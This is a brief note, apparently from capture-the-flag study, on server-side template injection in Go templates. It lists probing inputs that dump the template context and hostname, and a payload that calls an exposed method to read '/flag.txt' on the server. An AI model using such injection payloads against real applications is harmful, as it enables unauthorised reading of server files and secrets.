Golang SSTI

tpl文件  {{}}是go语言的模版括号
{{ . }}
{{ .ClientUA }}
{{ .ServerInfo.Hostname }}

Payload：
{{ .OutFileContents "/flag.txt" }}
